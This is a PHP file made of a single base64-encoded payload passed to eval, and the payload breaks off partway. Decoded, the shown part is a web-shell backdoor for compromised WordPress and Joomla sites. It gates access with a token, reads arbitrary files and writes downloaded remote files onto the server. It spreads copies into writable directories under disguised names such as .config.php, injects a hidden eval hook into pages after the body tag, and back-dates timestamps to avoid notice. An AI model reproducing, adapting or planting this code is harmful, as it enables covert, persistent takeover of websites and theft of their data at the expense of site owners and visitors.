<?php
eval(base64_decode('Ly92ZXJzaW9uIDIKJHZlcnNpb24gPSAnMC4wLjgnOwokZW5jb2RpbmcgPSAnYmFzZTY0JzsKZXJyb3JfcmVwb3J0aW5nKDApOwppbmlfc2V0KCdtZW1vcnlfbGltaXQnLCAnMTAyNE0nKTsKaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgJzk5OTknKTsKJHBocF92ZXJzaW9uID0gUEhQX01BSk9SX1ZFUlNJT04gLiAiLiIgLiBQSFBfTUlOT1JfVkVSU0lPTjsKJHRva2VuID0gJ2NkNzU4ZThmNTlkZmRmMDZhODUyYWRhZDI3Nzk4NmNhJzsKCgpmdW5jdGlvbiBkaXJUb0FycmF5KCRkaXIgPSAnLicsICRsaXN0ID0gYXJyYXkoKSkgewogICAkcmVzdWx0ID0gYXJyYXkoKTsKICAgJGNkaXIgPSBzY2FuZGlyKCRkaXIpOwogICBmb3JlYWNoICgkY2RpciBhcyAka2V5ID0+ICR2YWx1ZSkKICAgewogICAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIsIi4uIikpKQogICAgICB7CiAgICAgICAgIGlmIChpc19kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKQogICAgICAgICB7CiAgICAgICAgICAgIGFycmF5X3B1c2goJGxpc3QsICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgICAgICAgbGlzdCgkcmVzdWx0WyR2YWx1ZV0sICRsaXN0KSA9IGRpclRvQXJyYXkoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUsICRsaXN0KTsKICAgICAgICAgfQogICAgICAgICBlbHNlCiAgICAgICAgIHsKICAgICAgICAgICAgYXJyYXlfcHVzaCgkbGlzdCwgJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpOwogICAgICAgICAgICAkcmVzdWx0W10gPSAkdmFsdWU7CiAgICAgICAgIH0KICAgICAgfQogICB9CiAgIHJldHVybiBhcnJheSgkcmVzdWx0LCAkbGlzdCk7Cn0KCmZ1bmN0aW9uIGNsZWFyQ2FjaGUoJGRpciA9ICcuJykgewogICAkY2RpciA9IHNjYW5kaXIoJGRpcik7CiAgIGZvcmVhY2ggKCRjZGlyIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICAgIGlmICghaW5fYXJyYXkoJHZhbHVlLGFycmF5KCIuIiwiLi4iKSkpIHsKICAgICAgICAgaWYgKGlzX2RpcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSkpIHsKICAgICAgICAgICAgcnJtZGlyKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgICAgfQogICAgICAgICBpZiAoaXNfZmlsZSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSkpIHsKICAgICAgICAgICAgdW5saW5rKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgICAgfQogICAgICB9CiAgIH0KfQoKZnVuY3Rpb24gcnJtZGlyKCRkaXIpIHsKICAgaWYgKGlzX2RpcigkZGlyKSkgewogICAgICRvYmplY3RzID0gc2NhbmRpcigkZGlyKTsKICAgICBmb3JlYWNoICgkb2JqZWN0cyBhcyAkb2JqZWN0KSB7CiAgICAgICBpZiAoJG9iamVjdCAhPSAiLiIgJiYgJG9iamVjdCAhPSAiLi4iKSB7CiAgICAgICAgIGlmIChmaWxldHlwZSgkZGlyLkRJUkVDVE9SWV9TRVBBUkFUT1IuJG9iamVjdCkgPT0gImRpciIpIHJybWRpcigkZGlyLkRJUkVDVE9SWV9TRVBBUkFUT1IuJG9iamVjdCk7IGVsc2UgdW5saW5rKCRkaXIuRElSRUNUT1JZX1NFUEFSQVRPUi4kb2JqZWN0KTsKICAgICAgIH0KICAgICB9CiAgICAgcmVzZXQoJG9iamVjdHMpOwogICAgIHJtZGlyKCRkaXIpOwogICB9Cn0gCgoKZnVuY3Rpb24gZmluZFdEaXIoJGRpciA9ICcuJywgJHdfbGlzdCA9IGFycmF5KCkpIHsKICAgJHJlc3VsdCA9IGFycmF5KCk7CiAgICRjZGlyID0gc2NhbmRpcigkZGlyKTsKICAgZm9yZWFjaCAoJGNkaXIgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgaWYgKCFpbl9hcnJheSgkdmFsdWUsYXJyYXkoIi4iLCIuLiIpKSkgewogICAgICAgICBpZiAoaXNfZGlyKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKSkgewogICAgICAgICAgICBpZiAoaXNfd3JpdGVhYmxlKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKSkgewogICAgICAgICAgICAgICBhcnJheV9wdXNoKCR3X2xpc3QsICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBsaXN0KCRyZXN1bHRbJHZhbHVlXSwgJHdfbGlzdCkgPSBmaW5kV0RpcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSwgJHdfbGlzdCk7CiAgICAgICAgIH0KICAgICAgfQogICB9CiAgIHJldHVybiBhcnJheSgkcmVzdWx0LCAkd19saXN0KTsKfQoKZnVuY3Rpb24gaW5zZXJ0UmVuZGVyKCRkaXIgPSAnLicsICR3X2xpc3QgPSBhcnJheSgpKSB7CiAgICRyZXN1bHQgPSBhcnJheSgpOwogICAkY2RpciA9IHNjYW5kaXIoJGRpcik7CiAgIGZvcmVhY2ggKCRjZGlyIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICAgIGlmICghaW5fYXJyYXkoJHZhbHVlLGFycmF5KCIuIiwiLi4iKSkpIHsKICAgICAgICAgaWYgKGlzX2ZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgICRmaWxlID0gJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWU7CiAgICAgICAgICAgICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGUpOwogICAgICAgICAgICBpZiAoc3RyaXBvcygkY29udGVudCwgJzxib2R5JykgJiYgIXN0cnBvcygkY29udGVudCwgJ1xceDcyXFx4NjVcXHg2ZVxceDY0XFx4NjVcXHg3MicpICYmICFzdHJwb3MoJGNvbnRlbnQsICJldmFsKGdldF9vcHRpb24oJ3JlbmRlcicpKTsiKSkgewogICAgICAgICAgICAgICAkY29udGVudCA9IHByZWdfcmVwbGFjZSgnLyg8Ym9kKFtePl18XD8+fD0+KSpbXj9dPikvaW1zJywgJyQxPD9waHAgZXZhbChnZXRfb3B0aW9uKCJcXHg3MlxceDY1XFx4NmVcXHg2NFxceDY1XFx4NzIiKSk7ID8+JywgJGNvbnRlbnQpOwogICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGNvbnRlbnQpOwogICAgICAgICAgICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgICAgICAgICAgICAgdG91Y2goJGZpbGUsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgICAgICAgICAgfQogICAgICAgICB9CiAgICAgICAgIGlmIChpc19kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgIGlmIChpc193cml0ZWFibGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpKSB7CiAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHdfbGlzdCwgJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxpc3QoJHJlc3VsdFskdmFsdWVdLCAkd19saXN0KSA9IGluc2VydFJlbmRlcigkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR2YWx1ZSwgJHdfbGlzdCk7CiAgICAgICAgIH0KICAgICAgfQogICB9CiAgIHJldHVybiBhcnJheSgkcmVzdWx0LCAkd19saXN0KTsKfQoKCmZ1bmN0aW9uIG5hbWVHZW5lcmF0ZSgkZGlyKSB7CiAgJGZpbGVzID0gc2NhbmRpcigkZGlyKTsKICAkcGF0dGVybiA9ICcvXC5waHAkLyc7CiAgZm9yZWFjaCAoJGZpbGVzIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICBpZiAoIWlzX2ZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkdmFsdWUpIHx8ICFwcmVnX21hdGNoKCRwYXR0ZXJuLCAkdmFsdWUpKSB7CiAgICAgIHVuc2V0KCRmaWxlc1ska2V5XSk7CiAgICB9CiAgfQogIGlmIChjb3VudCgkZmlsZXMpID09IDApIHsKICAgICRlbXB0eV9kaXIgPSBhcnJheSgiMCIgPT4gImZ1bmN0aW9ucy5waHAiLCAiMSIgPT4gImNvbmZpZy5waHAiLCAiMiIgPT4gImluY2x1ZGVzLnBocCIsICIzIiA9PiAic2Vzc2lvbi5waHAiLCAiNCIgPT4gIi5mdW5jdGlvbnMucGhwIiwgIjUiID0+ICIuY29uZmlnLnBocCIsICI2IiA9PiAiLmluY2x1ZGVzLnBocCIsICI3IiA9PiAiLnNlc3Npb24ucGhwIik7CiAgICAkY2hvc2VuID0gJGVtcHR5X2RpcltyYW5kKDAsIGNvdW50KCRlbXB0eV9kaXIpIC0gMSldOwogIH0KICBlbHNlIHsKICAgICRmaWxlcyA9IGFycmF5X3ZhbHVlcygkZmlsZXMpOwogICAgJHByZWZpeCA9IGFycmF5KCIwIiA9PiAiLiIsICIxIiA9PiAiXyIsICIyIiA9PiAiIik7CiAgICAkc3VmZml4ID0gYXJyYXkoIjAiID0+ICJiYWsiLCAiMSIgPT4gIm9yaWciLCAiMiIgPT4gImNvcHkiLCAiMyIgPT4gImJhY2t1cCIsICI0IiA9PiAic3dwIiwgIjUiID0+ICJwaHAiLCAiNiIgPT4gInEiKTsKICAgICRjaG9zZW4gPSAkZmlsZXNbcmFuZCgwLCBjb3VudCgkZmlsZXMpIC0gMSldOwogICAgJGNob3NlbiA9IHByZWdfcmVwbGFjZSgnL1wucGhwJC8nLCAkcHJlZml4W3JhbmQoMCxjb3VudCgkcHJlZml4KSAtIDEpXSAuICRzdWZmaXhbcmFuZCgwLGNvdW50KCRzdWZmaXgpIC0gMSldIC4gJy5waHAnLCAkY2hvc2VuKTsKICAgIGlmIChyYW5kKDAsMTAwKSA8IDUwKSB7CiAgICAgICRjaG9zZW4gPSBwcmVnX3JlcGxhY2UoJy9eLycsICcuJywgJGNob3Nlbik7CiAgICB9CiAgfQogIHJldHVybiAkY2hvc2VuOwp9CgpmdW5jdGlvbiB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKSB7CiAgJGZpbGVzID0gYXJyYXkoKTsKICBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICBpZiAoIWluX2FycmF5KCR2YWx1ZSxhcnJheSgiLiIpKSkgewogICAgICAkZmlsZXNbJGtleV0gPSBhcnJheSgpOwogICAgICAkZmlsZXNbJGtleV1bJ25hbWUnXSA9ICR2YWx1ZTsKICAgICAgJGZpbGVzWyRrZXldWydhdGltZSddID0gZmlsZWF0aW1lKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgICAgJGZpbGVzWyRrZXldWydtdGltZSddID0gZmlsZW10aW1lKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHZhbHVlKTsKICAgIH0KICB9CiAgJGZpbGVzID0gYXJyYXlfdmFsdWVzKCRmaWxlcyk7CiAgJGNob3NlbiA9ICRmaWxlc1tyYW5kKDAsIGNvdW50KCRmaWxlcykgLSAxKV07CiAgcmV0dXJuICRjaG9zZW47Cn0KCmZ1bmN0aW9uIGdldF9ieV9jdXJsKCR1cmwpIHsKICAkY2ggPSBjdXJsX2luaXQoKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdDb0QnKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgJ0NvRCcpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKLy8gIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xWRVJTSU9OLCAnQ1VSTF9TU0xWRVJTSU9OX1RMU3YxXzInKTsKICAkY3VybFJlc3VsdHMgPSBjdXJsX2V4ZWMoJGNoKTsKICBjdXJsX2Nsb3NlKCRjaCk7CiAgcmV0dXJuICRjdXJsUmVzdWx0czsKfQoKZnVuY3Rpb24gZ2V0X2J5X3NvY2tldCgkdXJsKSB7CiAgJHVybF9wID0gKHBhcnNlX3VybCgkdXJsKSk7CiAgaWYgKCR1cmxfcFsnc2NoZW1lJ10gPT0gJ2h0dHBzJykgewogICAgJHBvcnQgPSA0NDM7CiAgICAkc2NoZW1lID0gJ3RsczovLyc7CiAgfSAKICBlbHNlIHsKICAgICRwb3J0ID0gODA7CiAgICAkc2NoZW1lID0gJyc7CiAgfQogICRob3N0ID0gJHVybF9wWydob3N0J107CiAgJHVyaSA9ICR1cmxfcFsncGF0aCddOwogICRxdWVyeSA9ICR1cmxfcFsncXVlcnknXTsKICAkZnAgPSBmc29ja29wZW4oJHNjaGVtZSAuICRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCA1KTsKICBpZiAoJHF1ZXJ5KSB7CiAgICAkcmVxID0gJHVyaS4iPyIuJHF1ZXJ5OwogIH0gCiAgZWxzZSB7CiAgICAkcmVxID0gJHVyaTsKICB9ICAgCiAgaWYgKCEkZnApIHsKICAgICAgZWNobyAiJGVycnN0ciAoJGVycm5vKTxiciAvPlxuIjsKICB9IGVsc2UgeyAKICAgICAgJG91dCA9ICJHRVQgIi4kcmVxLiIgSFRUUC8xLjFcclxuIjsKICAgICAgJG91dCAuPSAiSG9zdDogIi4kaG9zdC4iXHJcbiI7CiAgICAgICRvdXQgLj0gIlVzZXItQWdlbnQ6IENvRFxyXG4iOwogICAgICAkb3V0IC49ICJQcmFnbWE6IG5vLWNhY2hlXHJcbiI7CiAgICAgICRvdXQgLj0gIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXHJcbiI7CiAgICAgICRvdXQgLj0gIkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iOwogICAgICBmd3JpdGUoJGZwLCAkb3V0KTsKICAgICAgJGRhdGEgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRmcCk7CiAgICAgIGZjbG9zZSgkZnApOwogIH0KICAkZGF0YSA9IGV4cGxvZGUoIlxyXG5cclxuIiwgJGRhdGEpOwogIGFycmF5X3NoaWZ0KCRkYXRhKTsKICByZXR1cm4gaW1wbG9kZSgkZGF0YSk7Cn0KCmZ1bmN0aW9uIGdldF9yZW1vdGVfZmlsZSgkdXJsKSB7CiAgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ2N1cmwnKSkgewogICAgcmV0dXJuIGdldF9ieV9jdXJsKCR1cmwpOwogIH0KICBlbHNlaWYgKGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpID09IDEpIHsKICAgICRvcHRzID0gYXJyYXkoCiAgICAgICdodHRwJz0+YXJyYXkoCiAgICAgICAgJ21ldGhvZCc9PiJHRVQiLAogICAgICAgICdoZWFkZXInPT4iUmVmZXJlcjogQ29EXHJcbiIgLgogICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudDogQ29EXHJcbiIKICAgICAgKSwKICAgICAgJ3NzbCc9PmFycmF5KAogICAgICAgICdhbGxvd19zZWxmX3NpZ25lZCc9PnRydWUsCiAgICAgICAgJ3ZlcmlmeV9wZWVyJz0+ZmFsc2UsCiAgICAgICAgJ3ZlcmlmeV9wZWVyX25hbWUnPT5mYWxzZQogICAgICApCiAgICApOwogICAgJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOwogICAgcmV0dXJuIGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgfQogIGVsc2VpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc29ja2V0cycpKSB7CiAgICByZXR1cm4gZ2V0X2J5X3NvY2tldCgkdXJsKTsKICB9CiAgcmV0dXJuIE5VTEw7Cn0KCmZ1bmN0aW9uIGlzX2pvb21sYSgpIHsKICBpZiAoaXNfZmlsZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdjb25maWd1cmF0aW9uLnBocCcpKXsKICAgICRjb25mID0gZmlsZV9nZXRfY29udGVudHMoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnY29uZmlndXJhdGlvbi5waHAnKTsKICAgIGlmIChzdHJwb3MoJGNvbmYsICdjbGFzcyBKQ29uZmlnIHsnKSl7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgZWxzZSB7CiAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKZnVuY3Rpb24gaXNfd29yZHByZXNzKCkgewogIGlmIChpc19maWxlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWNvbmZpZy5waHAnKSl7CiAgICAkY29uZiA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWNvbmZpZy5waHAnKTsKICAgIGlmIChzdHJwb3MoJGNvbmYsICd3cC1zZXR0aW5ncy5waHAnKSl7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgZWxzZSB7CiAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKZnVuY3Rpb24gZ2V0Q01TKCkgewogIGlmIChpc19qb29tbGEoKSkgewogICAgJGNtcyA9ICdqb29tbGEnOwogIH0KICBlbHNlaWYgKGlzX3dvcmRwcmVzcygpKSB7CiAgICAkY21zID0gJ3dvcmRwcmVzcyc7CiAgfQogIGVsc2UgewogICAgJGNtcyA9ICd1bmtub3duJzsKICB9CiAgcmV0dXJuICRjbXM7Cn0KCmZ1bmN0aW9uIGdldEVuY29kZXIoKSB7CiAgaWYoZXh0ZW5zaW9uX2xvYWRlZCgnaW9uQ3ViZSBMb2FkZXInKSkgewogICAgJGVuY29kZXIgPSAnaW9uY3ViZV9sb2FkZXInOwogIH0KICBlbHNlaWYoZXh0ZW5zaW9uX2xvYWRlZCgnWmVuZCBPcHRpbWl6ZXJyJykpIHsKICAgICRlbmNvZGVyID0gJ3plbmRfb3B0aW1pemVyJzsKICB9CiAgZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoJ1NvdXJjZUd1YXJkaWFuJykpIHsKICAgICRlbmNvZGVyID0gJ3NvdXJjZV9ndWFyZGlhbic7CiAgfQogIGVsc2VpZihleHRlbnNpb25fbG9hZGVkKCdaZW5kIEd1YXJkIExvYWRlcicpKSB7CiAgICAkZW5jb2RlciA9ICd6ZW5kX2d1YXJkX2xvYWRlcic7CiAgfQogIGVsc2UgewogICAgJGVuY29kZXIgPSAnYmFzZTY0JzsKICB9CiAgcmV0dXJuICRlbmNvZGVyOwp9CgppZighaXNzZXQoJF9HRVRbInRva2VuIl0pICYmICFpc3NldCgkX1BPU1RbInRva2VuIl0pKSB7CiAgICRpc19hdXRoID0gZmFsc2U7CiAgIHBocGluZm8oKTsKfQplbHNlaWYgKG1kNSgkX0dFVFsidG9rZW4iXSkgPT0gJHRva2VuKXsKICAgJGlzX2F1dGggPSB0cnVlOwp9CmVsc2VpZiAobWQ1KCRfUE9TVFsidG9rZW4iXSkgPT0gJHRva2VuKXsKICAgJGlzX2F1dGggPSB0cnVlOwp9CmVsc2UgewogICAkaXNfYXV0aCA9IGZhbHNlOwogICBwaHBpbmZvKCk7Cn0KCmlmKGlzc2V0KCRfR0VUWyJpbmZvIl0pKSB7CiAgIHBocGluZm8oKTsKICAgcmV0dXJuOwp9CgppZihpc3NldCgkX0dFVFsiZ2V0X3RyZWUiXSkgJiYgJGlzX2F1dGgpIHsKICAgaWYoIWVtcHR5KCRfR0VUWyJnZXRfdHJlZSJdKSkgewogICAgICAkcGF0aCA9ICRfR0VUWyJnZXRfdHJlZSJdOwogICB9CiAgIGVsc2UgewogICAgICAkcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CiAgIH0KICAgbGlzdCgkdHJlZSwgJGxpc3QpID0gZGlyVG9BcnJheSgkcGF0aCk7CiAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ2dldF90cmVlJywgJ3BhdGgnID0+ICRwYXRoLCAndHJlZScgPT4gJGxpc3QpOwogICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsiZ2V0X3dyaXRlYWJsZSJdKSAmJiAkaXNfYXV0aCkgewogICBpZighZW1wdHkoJF9HRVRbImdldF93cml0ZWFibGUiXSkpIHsKICAgICAgJHBhdGggPSAkX0dFVFsiZ2V0X3dyaXRlYWJsZSJdOwogICB9CiAgIGVsc2UgewogICAgICAkcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CiAgIH0KICAgbGlzdCgkdHJlZSwgJHdyaXRlX2xpc3QpID0gZmluZFdEaXIoJHBhdGgsIGFycmF5KCkpOwogICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdnZXRfd3JpdGVhYmxlJywgJ3BhdGgnID0+ICRwYXRoLCAndHJlZScgPT4gJHdyaXRlX2xpc3QpOwogICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsic2V0X2ZpbGUiXSkgJiYgJGlzX2F1dGgpIHsKICBpZighZW1wdHkoJF9HRVRbInNldF9maWxlIl0pKSB7CiAgICAkcGF0aCA9ICRfR0VUWyJzZXRfZmlsZSJdOwogICAgaWYoIXByZWdfbWF0Y2goJy9eXC8vJywgJHBhdGgpKXsKICAgICAgJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRwYXRoOwogICAgfQogIH0KICBlbHNlIHsKICAgICRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICB9CiAgJGRpciA9IHByZWdfcmVwbGFjZSgnL1wvW15cL10rXC5waHAkLycsICcnLCAkcGF0aCk7CiAgJHVybCA9ICRfR0VUWyJ1cmwiXTsKICAkY29udGVudCA9IGdldF9yZW1vdGVfZmlsZSgkdXJsKTsKICBpZiAoZmlsZV9wdXRfY29udGVudHMoJHBhdGgsICRjb250ZW50KSAhPSBGQUxTRSkgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnc2V0X2ZpbGUnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycpOwogICAgJGRvbm9yID0gdGltZXN0YW1wR2VuZXJhdGUoJGRpcik7CiAgICB0b3VjaCgkcGF0aCwgJGRvbm9yWydtdGltZSddLCAkZG9ub3JbJ2F0aW1lJ10pOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3NldF9maWxlJywgJ3Jlc3VsdCcgPT4gJ2ZhaWwnKTsKICB9CiAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKfQoKaWYoaXNzZXQoJF9HRVRbImdldF9maWxlIl0pICYmICRpc19hdXRoKSB7CiAgJHBhdGggPSAkX0dFVFsiZ2V0X2ZpbGUiXTsKICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsKICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdnZXRfZmlsZScsICRwYXRoID0+ICRjb250ZW50KTsKICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsiZGlzdHJpYnV0ZSJdKSAmJiAkaXNfYXV0aCkgewogIGlmKCFlbXB0eSgkX0dFVFsicGF0aCJdKSkgewogICAgJHBhdGggPSAkX0dFVFsicGF0aCJdOwogICAgaWYoIXByZWdfbWF0Y2goJy9eXC8vJywgJHBhdGgpKXsKICAgICAgJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRwYXRoOwogICAgfQogIH0KICBlbHNlIHsKICAgICRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICB9CiAgaWYoIWVtcHR5KCRfR0VUWyJ0cyJdKSkgewogICAgJHRzID0gJF9HRVRbInRzIl07CiAgfQogIGVsc2UgewogICAgJHRzID0gJ25laWdoJzsKICB9CiAgaWYoIWVtcHR5KCRfR0VUWyJsaW1pdCJdKSkgewogICAgJGxpbWl0ID0gJF9HRVRbImxpbWl0Il07CiAgfQogIGVsc2UgewogICAgJGxpbWl0ID0gTlVMTDsKICB9CiAgJGRlZXBuZXNzID0gJF9HRVRbImRpc3RyaWJ1dGUiXTsKICAkdXJscyA9IGdldF9yZW1vdGVfZmlsZSgkX0dFVFsiZmlsZXMiXSk7CiAgJHJlbW90ZV9maWxlcyA9IGFycmF5KCk7CiAgZm9yZWFjaCAoZXhwbG9kZSgiICIsICR1cmxzKSBhcyAkZikgewogICAgYXJyYXlfcHVzaCgkcmVtb3RlX2ZpbGVzLCBnZXRfcmVtb3RlX2ZpbGUoJGYpKTsKICB9CiAgbGlzdCgkdHJlZSwgJHdyaXRlX2xpc3QpID0gZmluZFdEaXIoJHBhdGgsIGFycmF5KCkpOwogIHNodWZmbGUoJHdyaXRlX2xpc3QpOwogICR3cml0ZV9saXN0ID0gYXJyYXlfc2xpY2UoJHdyaXRlX2xpc3QsICRvZmZzZXQgPSAxLCAkbGVuZ3RoID0gJGxpbWl0KTsKICAkc2hlbGxzID0gYXJyYXkoKTsKICAkcGF0dGVybnMgPSAnLycgLiBwcmVnX3JlcGxhY2UoJy9cLy8nLCAnXC8nLCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pIC4gJy8nOwogICRyZXBsYWNlbWVudHMgPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAgJGV4Y2x1ZGVzID0gYXJyYXkoJy9wbHVnaW5zXC93cC1zdXBlci1jYWNoZS8nLCAnL3BsdWdpbnNcL2pldHBhY2svJywgJy9jYWNoZS8nLCAnL3dwLWluY2x1ZGVzXC9qcy8nLCAnL3BsdWdpbnNcL3Nlby11bHRpbWF0ZS8nKTsKICAkaW5jbHVkZXMgPSBhcnJheSgnLy4vJyk7CiAgaWYgKGlzX2pvb21sYSgpKSB7Ci8vICAgICRpbmNsdWRlcyA9IGFycmF5KCcvbGF5b3V0cy8nLCAnL3RlbXBsYXRlc1wvc3lzdGVtLycsICcvdGVtcGxhdGVzXC9wcm90b3N0YXIvJywgJy90ZW1wbGF0ZXNcL2JlZXozLycsICcvcGx1Z2luc1wvZWRpdG9ycy14dGQvJywgJy9wbHVnaW5zXC9maW5kZXIvJywgJy9wbHVnaW5zXC9xdWlja2ljb24vJyk7CiAgICAkaW5jbHVkZXMgPSBhcnJheSgnLy4vJyk7CiAgfQogIGlmIChpc193b3JkcHJlc3MoKSkgewovLyAgICAkaW5jbHVkZXMgPSBhcnJheSgnL3dwLWluY2x1ZGVzXC9wb21vLycsICcvd3AtaW5jbHVkZXNcL2ZvbnRzLycsICcvd3AtaW5jbHVkZXNcL0lEMy8nKTsKICAgICRpbmNsdWRlcyA9IGFycmF5KCcvLi8nKTsKICB9CiAgZm9yZWFjaCgkd3JpdGVfbGlzdCBhcyAkZGlyKSB7CiAgICAkbmFtZSA9IG5hbWVHZW5lcmF0ZSgkZGlyKTsKICAgICRzX3BhdGggPSAkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRuYW1lOwogICAgJG1ha2UgPSBmYWxzZTsKICAgIGZvcmVhY2ggKCRpbmNsdWRlcyBhcyAkaW5jKXsKICAgICAgaWYgKHByZWdfbWF0Y2goJGluYywgJHNfcGF0aCkpIHsKICAgICAgICAkbWFrZSA9IHRydWU7CiAgICAgIH0KICAgIH0KICAgIG